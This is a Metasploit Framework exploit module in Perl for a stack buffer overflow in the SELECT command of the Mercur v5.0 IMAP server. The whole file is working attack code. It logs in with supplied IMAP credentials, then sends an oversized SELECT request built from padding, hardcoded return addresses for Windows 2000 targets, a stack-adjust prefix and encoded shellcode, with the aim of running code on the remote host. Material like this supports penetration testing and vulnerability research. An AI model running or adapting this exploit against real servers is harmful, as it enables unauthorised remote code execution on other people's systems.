
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::mercur_imap_select_overflow;
use strict;
use base 'Msf::Exploit';
use Msf::Socket::Tcp;
use Pex::Text;

my $advanced = { };

my $info = {
	'Name'    => 'Mercur v5.0 IMAP SP3 SELECT Buffer Overflow',
	'Version'  => '$Revision: 1.1 $',
	'Authors' => [ 'Jacopo Cervini <acaro [at] jervus.it>', ],
	'Arch'    => [ 'x86' ],
	'OS'      => [ 'win32'],
	'Priv'    => 1,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 143],
		'USER'  => [1, 'DATA', 'IMAP Username'],
		'PASS'  => [1, 'DATA', 'IMAP Password'],
	  },

	'AutoOpts'  => { 'EXITFUNC'  => 'process' },
	'Payload' =>
	  {
		'Space'     => 400,
		'BadChars'  => "\x00",
		'Prepend'   => "\x81\xec\x96\x40\x00\x00\x66\x81\xe4\xf0\xff",
		'Keys'      => ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
Mercur v5.0 IMAP server is prone to a remotely exploitable 
stack-based buffer overflow vulnerability. This issue is due 
to a failure of the application to properly bounds check 
user-supplied data prior to copying it to a fixed size memory buffer.
Credit to Tim Taylor for discover the vulnerability.
}),

	'Refs'  =>
	  [
		['BID', '17138'],
	  ],

	'Targets' =>
	  [
		['Windows 2000 Server SP4 English', 126, 0x13e50b42],
		['Windows 2000 Pro SP1 English',    127, 0x1446e242],

	  ],

	'Keys' => ['imap'],

	'DisclosureDate' => 'March 17 2006',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);

	return($self);
}

sub Exploit {
	my $self = shift;

	my $targetHost  = $self->GetVar('RHOST');
	my $targetPort  = $self->GetVar('RPORT');
	my $targetIndex = $self->GetVar('TARGET');
	my $user        = $self->GetVar('USER');
	my $pass        = $self->GetVar('PASS');
	my $encodedPayload = $self->GetVar('EncodedPayload');
	my $shellcode   = $encodedPayload->Payload;
	my $target = $self->Targets->[$targetIndex];

	my $sock = Msf::Socket::Tcp->new(
		'PeerAddr' => $targetHost,
		'PeerPort' => $targetPort,
	  );

	if($sock->IsError) {
		$self->PrintLine('Error creating socket: ' . $sock->GetError);
		return;
	}

	my $resp = $sock->Recv(-1);
	chomp($resp);
	$self->PrintLine('[*] Got Banner: ' . $resp);

	my $sploit = "a001 LOGIN $user $pass\r\n";
	$sock->Send($sploit);
	my $resp = $sock->Recv(-1);
	if($sock->IsError) {
		$self->PrintLine('Socket error: ' . $sock->GetError);
		return;
	}
	if($resp !~ /^a001 OK LOGIN/) {
		$self->PrintLine('Login error: ' . $resp);
		return;
	}
	$self->PrintLine('[*] Logged in, sending overflow...');

	my $tribute = "\x43\x49\x41\x4f\x20\x42\x41\x43\x43\x4f\x20";
	my $splat0  = Pex::Text::AlphaNumText(94);
	my $special = "\x0d\x0a\x41\x41\x41\x41\x41\x41\x41\x41";
	my $splat1  = Pex::Text::AlphaNumText(453);

	$sploit =
	  "a001 select ". $tribute . $splat0 . Pex::Text::AlphaNumText($target->[1]). pack('V', $target->[2]) . $special . $shellcode . $splat1 . "\r\n";

	$self->PrintLine(sprintf ("[*] Trying ".$target->[0]." using heap address at 0x%.8x...", $target->[2]));

	$sock->Send($sploit);

	my $resp = $sock->Recv(-1);
	if(length($resp)) {
		$self->PrintLine('[*] Got response, bad: ' . $resp);
	}
	return;
}

1;
